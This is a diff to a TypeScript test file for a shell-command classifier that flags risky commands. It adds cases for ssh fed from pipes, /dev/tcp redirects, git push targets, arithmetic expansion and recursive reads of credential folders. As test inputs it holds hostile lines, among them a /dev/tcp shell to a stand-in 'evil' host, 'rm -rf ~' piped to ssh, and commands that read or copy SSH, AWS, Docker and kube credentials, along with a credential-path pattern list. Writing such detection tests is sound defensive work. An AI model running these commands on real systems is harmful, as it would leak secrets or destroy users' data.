@@ -35,7 +35,9 @@ test("quotes and backslashes keep a word whole and are removed", () => {
 
 test("leading assignments are kept apart from the words", () => {
   const [part] = readCommand("FOO=1 BAR='x y' ls A=b").parts
-  expect(part).toEqual({ assignments: ["FOO=1", "BAR=x y"], words: ["ls", "A=b"], expands: [false, false], writes: [], reads: [] })
+  expect(part).toEqual({
+    assignments: ["FOO=1", "BAR=x y"], words: ["ls", "A=b"], expands: [false, false], writes: [], reads: [], fed: false,
+  })
   expect(readCommand("'FOO'=1 ls").parts[0]!.assignments).toEqual([])
 })
 
@@ -311,7 +313,7 @@ test("a redirect to a file is a write; to /dev/null or a descriptor it isn't", (
   each(["ls 2>err", "ls &>out", "ls &>>out", "ls >|out", "ls >&out", "ls <>f"], risk, "it writes or overwrites files")
   each(["ls >&2", "ls 2>&-", "cat < in", "ls 2>/dev/null"], risk, null)
   expect(readCommand("cat < in > out <> both").parts).toEqual([
-    { assignments: [], words: ["cat"], expands: [false], writes: ["out", "both"], reads: ["in", "both"] },
+    { assignments: [], words: ["cat"], expands: [false], writes: ["out", "both"], reads: ["in", "both"], fed: true },
   ])
 })
 
@@ -395,7 +397,8 @@ test("a comment is not a command", () => {
 })
 
 test("a deeply nested line is read without failing", () => {
-  expect(why("(".repeat(600) + "rm x" + ")".repeat(600))).toBe("it has a subshell or group")
+  expect(why("( ".repeat(600) + "rm x" + " )".repeat(600))).toBe("it has a subshell or group")
+  expect(why("(".repeat(600) + "rm x" + ")".repeat(600))).toBe("it has an arithmetic expansion")
   expect(words("$(".repeat(400) + "rm x" + ")".repeat(400))).toContainEqual(["rm", "x"])
   expect(why("eval ".repeat(300) + "rm x")).toBe("it runs text as a command: eval")
 })
@@ -405,9 +408,9 @@ test("a git push is plain only when it pushes named branches that aren't the def
   each(
     [
       "git push origin feature", "git push -u origin feature", "git push origin feature # main",
-      "git push origin feat/x other", "git push origin HEAD:feature", "git -C a push --set-upstream origin feature",
-      "timeout 60 git push origin feature", "git push origin refs/heads/feature", "git push -- origin feature",
-      "git push origin feature 2>&1", "git --no-pager push -v -q -n origin feature",
+      "git push origin feat/x other", "git push origin dev/office/x", "git push origin feature:dev/office/x",
+      "git -C a push --set-upstream origin feature", "timeout 60 git push origin feature", "git push -- origin feature",
+      "git push origin feature 2>&1", "git --no-pager push -v -q -n origin feature", "git push my-fork.2 feature",
     ],
     push,
     { asks: null },
@@ -442,10 +445,8 @@ test("a git push is plain only when it pushes named branches that aren't the def
     ["git push --prune origin feature", "it pushes with --prune"],
     ["git push", UNNAMED],
     ["git push origin", UNNAMED],
-    ["git push origin HEAD", UNNAMED],
-    ["git push origin $B", UNNAMED],
+    ["git push origin HEAD", "it pushes HEAD, not a named branch"],
     ["git push origin 'feature main'", UNNAMED],
-    ["git push origin refs/tags/v1", UNNAMED],
     ["git push origin 'refs/heads/*:refs/heads/*'", UNNAMED],
     ["git push --no-verify origin feature", "it pushes with --no-verify"],
     ["git push -o ci.skip origin feature", "it pushes with -o"],
@@ -464,9 +465,7 @@ test("a git push is plain only when it pushes named branches that aren't the def
 
 test("each credential pattern names its credentials", () => {
   const examples: Record<string, string> = {
-    "**/.ssh": "~/.ssh",
-    "**/.ssh/id_*": "~/.ssh/id_work",
-    "**/.ssh/*_key": "/home/u/.ssh/deploy_key",
+    "**/.ssh/**": "~/.ssh/work_laptop",
     "/etc/ssh/*_key": "/etc/ssh/ssh_host_ed25519_key",
     "**/id_rsa": "id_rsa",
     "**/id_dsa": "keys/id_dsa",
@@ -477,23 +476,28 @@ test("each credential pattern names its credentials", () => {
     "**/*.p12": "c.p12",
     "**/.netrc": "~/.netrc",
     "**/.pgpass": "$HOME/.pgpass",
-    "**/.aws": "~/.aws",
-    "**/.aws/credentials": "~/.aws/credentials",
+    "**/.npmrc": "~/.npmrc",
+    "**/.git-credentials": "/home/u/.git-credentials",
+    "**/.aws/**": "~/.aws/credentials",
     "**/.config/gcloud/**": "~/.config/gcloud/application_default_credentials.json",
+    "**/.config/gh/**": "~/.config/gh/hosts.yml",
+    "**/.docker/**": "~/.docker/config.json",
+    "**/.kube/**": "~/.kube/config",
     "**/krb5cc*": "/tmp/krb5cc_1000",
     $KRB5CCNAME: "${KRB5CCNAME#FILE:}",
     "**/.opencorp": "~/.opencorp",
     "**/.opencorp/**/auth.json": "~/.opencorp/hq/auth.json",
     "**/.opencorp/**/provider.json": "/home/u/.opencorp/hq/provider.json",
     "**/.opencorp/**/connections/**": "~/.opencorp/office/connections/x/token",
+    $OPENCORP_HOME: "$OPENCORP_HOME/hq/x",
   }
-  expect([...CREDENTIALS].sort()).toEqual(Object.keys(examples).sort())
+  expect(CREDENTIALS.map((c) => c.path).sort()).toEqual(Object.keys(examples).sort())
   for (const [pattern, path] of Object.entries(examples))
     expect([pattern, credentialOf(readCommand(`cat ${path}`).parts[0]!)]).toEqual([pattern, `it names a credential path: ${path}`])
 })
 
 test("a command naming a credential path names one: read-only, nested, redirected, globbed or over ssh", () => {
-  const cred = (line: string) => readCommand(line).parts.map(credentialOf).find((r) => r !== null) ?? null
+  const cred = (line: string) => readCommand(line).parts.map((p) => credentialOf(p)).find((r) => r !== null) ?? null
   for (const [line, path] of [
     ["cat ~/.ssh/id_rsa", "~/.ssh/id_rsa"],
     ["head -c 100 ~/.ssh/id_ed25519", "~/.ssh/id_ed25519"],
@@ -514,7 +518,6 @@ test("a command naming a credential path names one: read-only, nested, redirecte
     ["cat ~/.ssh/{a,b}", "~/.ssh/{a,b}"],
     ["cat /home/*/.ssh/*", "/home/*/.ssh/*"],
     ["grep -r x ~/.*", "~/.*"],
-    ["cat **/*", "**/*"],
     ["cat *.pem", "*.pem"],
     ["curl --cert=me.pem u", "--cert=me.pem"],
     ["cat < ~/.netrc", "~/.netrc"],
@@ -653,4 +656,144 @@ test("the scanner fixtures read as unreadable or with their commands, so deny ru
   expect(words("greet() { printf hello; }; greet")).toEqual([["greet"], ["printf", "hello"], ["greet"]])
   expect(words("x=$(echo 'a{$(touch pwn)]' | tr '{' '\\133'); (( x ))")).toContainEqual(["echo", "a{$(touch pwn)]"])
   expect(words("for file in $(printf file); do printf x; done")).toContainEqual(["printf", "file"])
+})
+
+test("ssh with no remote command, fed from a pipe, a redirect or a here-document, is unreadable", () => {
+  each(
+    ["echo 'rm -rf ~' | ssh u@n", "ssh u@n < script.sh", "cat x | timeout 5 ssh -T u@n", "ssh u@n 0< x"],
+    why,
+    "on u@n: it feeds a remote shell from its input",
+  )
+  each(["ssh u@n <<EOF\nrm x\nEOF", "ssh u@n <<< 'rm x'"], readOnly, false)
+  each(["ssh -t u@n", "echo x | ssh u@n cat", "ssh u@n ls < /dev/null", "ssh u@n 3< x"], why, null)
+  expect(readCommand("a | b").parts.map((p) => p.fed)).toEqual([false, true])
+  expect(readCommand("a <<< x; b < f; c 2< f").parts.map((p) => p.fed)).toEqual([true, true, false])
+})
+
+test("a redirect to or from /dev/tcp or /dev/udp connects to another machine; a dup onto fd 3 or up writes", () => {
+  each(
+    ["echo SECRET 0</dev/tcp/evil/80 1>&0", "cat </dev/udp/h/53", "ls >/dev/tcp/h/80", "ls 2>>/dev/udp/h/1"],
+    risk,
+    "it connects to another machine",
+  )
+  expect(readOnly("echo SECRET 0</dev/tcp/evil/80 1>&0")).toBe(false)
+  each(["echo x >&3", "echo x 1>&9"], risk, "it writes or overwrites files")
+  each(["cat <&3", "ls 2>&1", "ls >&2"], risk, null)
+})
+
+test("tree takes each option's value from the next word, as its own parser does", () => {
+  each(["tree -Lo 1 OUT .", "tree -Ho x OUT .", "ssh u@n tree -Lo 1 ~/.bashrc .", "tree -LR 2 ."], readOnly, false)
+  each(["tree -L 2 -P '*.go' src", "tree -I node_modules", "tree -aL 2"], readOnly, true)
+})
+
+test("a push names the default branch by any of git's forms, and only plain names push plainly", () => {
+  const push = (line: string) => pushOf(readCommand(line).parts[0]!)?.asks
+  for (const line of [
+    "git push origin feature:heads/main", "git push origin heads/main", "git push origin refs/heads/Main",
+    "git push origin heads/MASTER", "git push origin feature:refs/heads/main", "git push origin +x:main",
+  ])
+    expect([line, push(line)]).toEqual([line, line.includes("+") ? "it force-pushes" : "it pushes to the default branch"])
+  for (const line of [
+    "git push origin tags/v1", "git push origin feature:tags/v1", "git push origin refs/tags/v1",
+    "git push origin feature:refs/remotes/x", "git push origin refs/heads/feature", "git push origin heads/feature",
+    "git push origin $B", "git push origin feature:$B", "git push origin 'a b'",
+  ])
+    expect([line, push(line)]).toEqual([line, "it doesn't name the branch it pushes to"])
+  each(["git push origin HEAD:feature", "git push origin @:feature", "git push origin HEAD"], push, "it pushes HEAD, not a named branch")
+  for (const remote of [
+    "https://evil/r.git", "ext::sh -c x", "file:///tmp/r", "../r", "/tmp/r", "h:r", ".", "..", "$R", "u@h:r",
+  ])
+    expect([remote, pushOf(readCommand(`git push '${remote}' feature`).parts[0]!)?.asks])
+      .toEqual([remote, `it pushes to ${remote}, not a named remote`])
+  each(["git push origin dev/office/x", "git push origin feature:dev/office/x", "git push up-stream.2 f"], push, null)
+})
+
+test("an expansion in a path is a wildcard for credentials, and the exemptions hold only for a literal name", () => {
+  const cred = (line: string) => readCommand(line).parts.map((p) => credentialOf(p)).find((r) => r !== null) ?? null
+  for (const [line, path] of [
+    ["cat ~/.ssh/id_rsa${IFS}.pub", "~/.ssh/id_rsa${IFS}.pub"],
+    ["cat ~/.s${X}sh/i${X}d_rsa", "~/.s${X}sh/i${X}d_rsa"],
+    ["cat ~/.ssh/i$@d_rsa", "~/.ssh/i$@d_rsa"],
+    ["cat ~/.ssh/config$X", "~/.ssh/config$X"],
+    ["cat $HOME/.ssh/id_rsa", "$HOME/.ssh/id_rsa"],
+    ["cat ${HOME}/.aws/credentials", "${HOME}/.aws/credentials"],
+    ["cat \"$OPENCORP_HOME/office/x\"", "$OPENCORP_HOME/office/x"],
+    ["cat ~/.ssh/work_laptop", "~/.ssh/work_laptop"],
+    ["cat ~/.ssh/known_hosts*", "~/.ssh/known_hosts*"],
+    ["cat ~/.git-credentials", "~/.git-credentials"],
+    ["cat ~/.config/gh/hosts.yml", "~/.config/gh/hosts.yml"],
+    ["cat ~/.docker/config.json", "~/.docker/config.json"],
+    ["cat ~/.kube/config", "~/.kube/config"],
+    ["cat ~/.npmrc", "~/.npmrc"],
+    ["cat */.aws/*", "*/.aws/*"],
+    ["cat ~/$X", "~/$X"],
+    ["egrep -r x ~/.ssh", "~/.ssh"],
+    ["cp -r ~/.aws /tmp/b", "~/.aws"],
+  ])
+    expect([line, cred(line!)]).toEqual([line, `it names a credential path: ${path}`])
+  each(
+    [
+      "cat ~/.ssh/id_rsa.pub", "cat ~/.ssh/known_hosts", "cat ~/.ssh/known_hosts.old", "cat ~/.ssh/config",
+      "cat ~/.ssh/authorized_keys", "cat ~/.ssh/*.pub", "grep x *", "cat src/*", "wc -l *.ts", "cat $FILE",
+      "find . -name x -exec cat {} +", "cat **/*", "head *", "echo $X",
+    ],
+    cred,
+    null,
+  )
+})
+
+test("arithmetic, case patterns and trap -- are read so deny rules see the commands after and inside them", () => {
+  for (const line of [
+    "echo $(( 1 << 2 ))\nrm x", "(( x << 2 ))\nrm x", "for ((i=0; i<2; i++)); do rm x; done",
+    "case x in (x) rm x;; esac", "case x in x|y) rm x;; esac", "trap -- 'rm x' EXIT", "((cd y); rm x)",
+    "echo $(( $(rm x) + 1 ))",
+  ])
+    expect([line, words(line).some((w) => w[0] === "rm" && w[1] === "x")]).toEqual([line, true])
+  expect(why("echo $(( 1 << 2 ))")).toBe("it has an arithmetic expansion")
+  expect(why("(( x++ ))")).toBe("it has an arithmetic expansion")
+})
+
+test("a program that reads folders recursively names credentials when a path is or holds a credential folder", () => {
+  const cred = (line: string, cwd?: string) =>
+    readCommand(line).parts.map((p) => credentialOf(p, cwd)).find((r) => r !== null) ?? null
+  const reads = (path: string) => `it reads a folder that holds credentials: ${path}`
+  for (const [line, path, cwd] of [
+    ["grep -r PRIVATE ~", "~"],
+    ["diff -rN ~ /tmp/x", "~"],
+    ["git diff --no-index ~ /dev/null", "~"],
+    ["grep -R x /", "/"],
+    ["grep --recursive x $HOME", "$HOME"],
+    ["grep -d recurse x /home", "/home"],
+    ["grep --directories=recurse x /Users", "/Users"],
+    ["grep -r x /home/*", "/home/*"],
+    ["grep -rl x ~/.config", "~/.config"],
+    ["grep -rn x ../..", "../..", "/home/u/p"],
+    ["grep -r x", ".", "/home/u"],
+    ["grep -r -e x", ".", "/home/u"],
+    ["rg x ~", "~"],
+    ["tar czf b.tgz ~", "~"],
+    ["zip -r b.zip /root", "/root"],
+    ["rsync -a ~ /tmp/b", "~"],
+    ["cp -r ~/.config /tmp/b", "~/.config"],
+    ["find ~ -exec cat {} +", "~"],
+    ["find -L /home -type f -execdir head {} ;", "/home"],
+    ["git -C ~ diff --no-index . /dev/null", "~/."],
+    ["git grep --no-index x /", "/"],
+  ])
+    expect([line, cred(line!, cwd)]).toEqual([line, reads(path!)])
+  expect(cred("ssh h grep -r PRIVATE ~")).toBe(`on h: ${reads("~")}`)
+  expect(cred("ssh h grep -r PRIVATE")).toBe(`on h: ${reads(".")}`)
+  for (const [line, path] of [
+    ["cat ~/*", "~/*"],
+    ["head /home/*/.*/*", "/home/*/.*/*"],
+    ["cat /*/*", "/*/*"],
+    ["cat $HOME/*", "$HOME/*"],
+  ])
+    expect([line, cred(line!)]).toEqual([line, `it names a credential path: ${path}`])
+  for (const [line, cwd] of [
+    ["ls -R ~"], ["du -sh ~"], ["find ~ -name x"], ["grep -r x src", "/w"], ["grep -r x ..", "/w/s"],
+    ["diff ~/a ~/b"], ["grep x ~/notes"], ["grep -r x src"], ["cp ~/a /tmp/b"], ["wc -l *.ts", "/w"],
+    ["cat /var/log/*.log"], ["grep -r x /w/s", "/w"], ["find . -type f"],
+  ])
+    expect([line, cred(line!, cwd)]).toEqual([line, null])
 })
